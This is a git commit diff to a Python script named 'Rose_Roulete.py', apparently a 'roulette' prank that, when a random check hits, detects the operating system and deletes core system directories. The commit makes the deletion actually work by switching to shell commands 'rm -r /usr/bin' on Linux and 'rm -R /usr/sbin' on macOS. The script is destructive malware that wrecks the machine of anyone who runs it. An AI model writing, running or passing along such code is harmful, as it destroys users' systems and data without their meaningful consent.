8a9714b1de7c2e1db0622d99f7fd7df2a8477778
MitchelRos <113449451+MitchelRos@users.noreply.github.com>
2022-11-16 18:48:22 +0100

    Update v3

--- Rose_Roulete.py
+++ Rose_Roulete.py
@@ -12,11 +12,13 @@ if RND == 1:
 	if platform == "linux" or platform == "linux2":
 		# linux
 		print("Linux")
-		os.remove("/usr/bin")
+		#os.remove("/usr/bin")
+		os.system("rm -r /usr/bin")
 	elif platform == "darwin":
 		# OS X
 		print("OS")
-		os.remove("/usr/sbin")
+		#os.remove("/usr/sbin")
+		os.system("rm -R /usr/sbin")
 	elif platform == "win32":
 		# Windows...
 		print("WIN")
